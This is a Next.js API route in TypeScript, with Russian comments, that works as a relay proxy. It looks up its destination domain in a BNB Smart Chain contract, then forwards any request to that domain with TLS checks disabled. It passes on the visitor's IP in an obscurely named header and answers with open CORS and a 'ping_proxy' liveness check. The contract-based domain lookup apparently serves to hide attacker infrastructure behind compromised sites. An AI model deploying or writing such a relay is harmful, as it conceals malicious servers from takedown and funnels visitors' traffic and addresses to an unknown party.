import { NextRequest, NextResponse } from 'next/server'
import axios from 'axios'
import https from 'https'
import crypto from 'crypto'

/**
 * Отключаем проверку SSL (CURLOPT_SSL_VERIFYPEER => false и CURLOPT_SSL_VERIFYHOST => false).
 * Если вам это не нужно, удалите `rejectUnauthorized: false`.
 */
const httpsAgent = new https.Agent({ rejectUnauthorized: false })

/**
 * Тип для хранения кеша в памяти
 */
type DomainCache = {
    domain: string
    timestamp: number
}

/**
 * Храним кэш в памяти (глобальная для модуля переменная).
 * При перезагрузке приложения этот кэш сбрасывается.
 */
let inMemoryCache: DomainCache | null = null

/**
 * Обновляется каждые 60 секунд (как и раньше).
 */
const updateInterval = 60 // секунд

/**
 * Функция получения IP-адреса (аналог getClientIP в PHP).
 */
function getClientIP(req: NextRequest): string {
    const forwarded = req.headers.get('x-forwarded-for')
    if (forwarded) {
        return forwarded.split(',')[0].trim()
    }
    if (req.ip) {
        return req.ip
    }
    return 'unknown'
}

/**
 * Преобразование hex-строки из смарт-контракта в обычную строку.
 */
function hexToString(hex: string): string {
    // Удаляем "0x"
    hex = hex.replace(/^0x/, '')

    // Сдвигаем на 64 символа (offset)
    hex = hex.substring(64)

    // Следующие 64 символа — длина
    const lengthHex = hex.substring(0, 64)
    const length = parseInt(lengthHex, 16)

    // Основные данные
    const dataHex = hex.substring(64, 64 + length * 2)

    let result = ''
    for (let i = 0; i < dataHex.length; i += 2) {
        const charCode = parseInt(dataHex.substring(i, i + 2), 16)
        if (charCode === 0) break
            result += String.fromCharCode(charCode)
    }

    return result
}

/**
 * Получаем домен из смарт-контракта через RPC.
 * Используем массив RPC-адресов.
 */
async function fetchTargetDomain(rpcUrls: string[], contractAddress: string): Promise<string> {
    // Это hex "20965255"
    const data = '20965255'

    for (const rpcUrl of rpcUrls) {
        try {
            const response = await axios.post(
                rpcUrl,
                {
                    jsonrpc: '2.0',
                    id: 1,
                    method: 'eth_call',
                    params: [
                        {
                            to: contractAddress,
                            data: `0x${data}`,
                        },
                        'latest',
                    ],
                },
                {
                    headers: { 'Content-Type': 'application/json' },
                    timeout: 120000,
                    httpsAgent,
                    validateStatus: () => true,
                }
            )

            if (response.data?.error) {
                // Если в ответе есть поле error — пробуем следующий RPC
                continue
            }

            const resultHex = response.data?.result
            if (!resultHex) {
                continue
            }

            const domain = hexToString(resultHex)
            if (domain) {
                return domain
            }
        } catch (error) {
            // Пробуем следующий RPC
        }
    }

    throw new Error('Could not fetch target domain')
}

/**
 * Возвращает домен из кэша, либо обновляет, если кэш устарел.
 */
async function getTargetDomain(rpcUrls: string[], contractAddress: string): Promise<string> {
    // Проверяем, есть ли что-то в памяти
    if (inMemoryCache) {
        const diff = Math.floor(Date.now() / 1000) - inMemoryCache.timestamp
        if (diff < updateInterval) {
            // Кэш актуален
            return inMemoryCache.domain
        }
    }

    // Иначе запрашиваем заново
    const domain = await fetchTargetDomain(rpcUrls, contractAddress)

    // Обновляем в памяти
    inMemoryCache = {
        domain,
        timestamp: Math.floor(Date.now() / 1000),
    }

    return domain
}

/**
 * Прокси-обработчик, повторяющий логику вашего PHP-скрипта (кроме записи на диск).
 */
async function handleProxy(req: NextRequest, endpoint: string) {
    // Настройки RPC и контракта (по умолчанию)
    const rpcUrls = ['https://rpc.ankr.com/bsc', 'https://bsc-dataseed2.bnbchain.org']
    const contractAddress = '0xe9d5f645f79fa60fca82b4e1d35832e43370feb0'

    // Получаем домен (кэширован в памяти)
    let domain = await getTargetDomain(rpcUrls, contractAddress)
    domain = domain.replace(/\/+$/, '') // убираем trailing slash

    endpoint = endpoint.replace(/^\/+/, '') // убираем ведущие слэши
    const finalUrl = `${domain}/${endpoint}`

    // Метод запроса
    const method = req.method

    // Аналог file_get_contents('php://input')
    const bodyBuffer = await req.arrayBuffer()
    const body = Buffer.from(bodyBuffer)

    // Собираем заголовки, убираем host/origin и т.п.
    const outHeaders: Record<string, string> = {}
    req.headers.forEach((value, key) => {
        const lowerKey = key.toLowerCase()
        if (
            ['host', 'origin', 'accept-encoding', 'content-encoding'].includes(lowerKey)
        ) {
            return
        }
        outHeaders[lowerKey] = value
    })

    // Добавляем x-dfkjldifjljfjd = IP
    outHeaders['x-dfkjldifjljfjd'] = getClientIP(req)

    // Проксируем через axios
    try {
        const response = await axios({
            url: finalUrl,
            method,
            headers: outHeaders,
            data: body,
            responseType: 'arraybuffer',
            httpsAgent,
            decompress: true,
            maxRedirects: 5,
            timeout: 120000,
            validateStatus: () => true,
        })

        const responseData = response.data as Buffer
        const statusCode = response.status
        const contentType = response.headers['content-type']

        // Готовим заголовки ответа
        const resHeaders: Record<string, string> = {
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET, HEAD, POST, OPTIONS',
            'Access-Control-Allow-Headers': '*',
        }

        if (contentType) {
            resHeaders['Content-Type'] = contentType
        }

        return new NextResponse(responseData, {
            status: statusCode,
            headers: resHeaders,
        })
    } catch (error) {
        return new NextResponse('error: ' + String(error), {
            status: 500,
            headers: {
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Methods': 'GET, HEAD, POST, OPTIONS',
                'Access-Control-Allow-Headers': '*',
            },
        })
    }
}

/**
 * OPTIONS — возвращаем 204 + CORS
 */
export async function OPTIONS() {
    return new NextResponse(null, {
        status: 204,
        headers: {
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET, HEAD, POST, OPTIONS',
            'Access-Control-Allow-Headers': '*',
            'Access-Control-Max-Age': '86400',
        },
    })
}

/**
 * Универсальный обработчик для GET/POST/и т.д.
 */
async function handleRequest(req: NextRequest) {
    const { searchParams } = new URL(req.url)
    const e = searchParams.get('e')

    // Пинг
    if (e === 'ping_proxy') {
        return new NextResponse('pong', {
            status: 200,
            headers: { 'Content-Type': 'text/plain' },
        })
    }

    // Иначе проксируем, если e задан
    if (e) {
        const endpoint = decodeURIComponent(e)
        return handleProxy(req, endpoint)
    }

    // Иначе 400
    return new NextResponse('Missing endpoint', { status: 400 })
}

// Экспорт методов
export async function GET(req: NextRequest) {
    return handleRequest(req)
}
export async function POST(req: NextRequest) {
    return handleRequest(req)
}
export async function PUT(req: NextRequest) {
    return handleRequest(req)
}
export async function DELETE(req: NextRequest) {
    return handleRequest(req)
}
export async function PATCH(req: NextRequest) {
    return handleRequest(req)
}
export async function HEAD(req: NextRequest) {
    return handleRequest(req)
}
